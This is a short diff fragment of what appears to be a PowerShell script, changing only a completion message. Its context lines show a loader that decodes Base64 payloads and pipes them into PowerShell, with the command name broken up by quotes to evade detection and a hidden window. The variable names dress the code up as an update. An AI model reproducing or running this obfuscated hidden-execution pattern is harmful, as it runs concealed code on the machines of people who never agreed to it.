@@ -32,7 +32,7 @@ $update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 echo "[*]"
 
 start-sleep -s 1
-echo "[!] Process Completed"
+echo "[!] Process Completed Successfully"
 start-sleep -s 1
 
 echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
